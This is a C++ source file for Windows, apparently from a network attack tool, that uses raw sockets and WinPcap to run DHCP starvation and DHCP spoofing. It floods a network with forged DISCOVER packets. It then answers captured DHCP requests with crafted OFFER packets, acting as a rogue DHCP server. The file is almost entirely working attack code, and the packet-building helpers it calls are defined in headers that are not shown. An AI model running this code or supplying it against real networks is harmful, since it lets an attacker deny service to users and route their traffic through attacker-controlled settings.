#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define HAVE_REMOTE
#define WPCAP

#include "Headers.h"
#include "Packets.h"
#include "Utils.h"
#include "Spoofing.h"

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <time.h>
#include <iostream>
#include <Mstcpip.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"wpcap.lib")

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);



void sendDiscoverPacket(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

#if _DEBUG
	if (s == SOCKET_ERROR)
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
#endif

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket


	char* raw_packet = new char[65536];
	CreateDHCPDiscoverPacket(raw_packet, info);

	sendto(
		s,
		raw_packet,
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
		0, (sockaddr*)&dst,
		sizeof(dst)
	);
	delete[] raw_packet;
	closesocket(s);
}

void recvDHCPPsackets(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in sockinfo;
	sockaddr_in dst;
	int size = sizeof(dst);

	int optval = 1;
	int in;
	int error;

	DHCP_header pDHCP{};
	UDP_header pUDP{};
	IP_header pIP{};

	sockinfo.sin_addr.s_addr = inet_addr((const char*)info.ipv4);
	sockinfo.sin_family = AF_INET;
	sockinfo.sin_port = htons(0);


	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket

	if (s == SOCKET_ERROR)
		std::cout << "Socket error <" << WSAGetLastError() << ">" << WSACleanup() << std::endl;

	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));

	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);

	char* raw_packet = new char[65536];
	memset(raw_packet, 0, 65536);

	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);

	if (error == SOCKET_ERROR)
		std::cout << " recv error: " << WSAGetLastError() << WSACleanup() << std::endl;

	//std::cout << inet_ntoa(dst.sin_addr) << std::endl;
	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
	sockinfo.sin_addr.s_addr = pIP.ip_destaddr;
	if (ntohs(pUDP.dst_port) == 67)
	{
		std::cout << inet_ntoa(sockinfo.sin_addr) << std::endl;
		if (checkForDHCP(pDHCP))
			sendOfferPacket(pDHCP, info);
	}
	delete[] raw_packet;
	closesocket(s);
}

void sendOfferPacket(DHCP_header& hHeader, AddressInfo& info)
{
	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
	
	char* raw_packet = new char[65536];
	if (!sock)
		std::cout << "error in pcap socket" << std::endl;
	
	CreateDHCPOfferPacket(raw_packet, (void*)&hHeader, info);

	std::cout << "check" << std::endl;
	printHex((char*)&((Ethernet_header*)((u_char*)raw_packet))->frame_type, 2);
	printIP(((IP_header*)((u_char*)raw_packet + sizeof(Ethernet_header)))->ip_destaddr);
	std::cout << ntohs(((UDP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header)))->dst_port) << std::endl;
	printHex(((DHCP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header)))->chaddr, 6);
	
	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
		std::cout << "error " <<  pcap_geterr(sock) << std::endl;

#if _DEBUG
	std::cout << "sent" << std::endl;
#endif
	delete[] raw_packet;
	pcap_close(sock);
}


void startDHCPStarvation(AddressInfo& info)
{
	
	for (int i = 0; i < 1000; i++)
	{
		sendDiscoverPacket(info);
		Sleep(20);
	}

}


void startDHCPSpoofing(AddressInfo& info)
{
	while (1)
	{
		recvDHCPPsackets(info);
	}
}
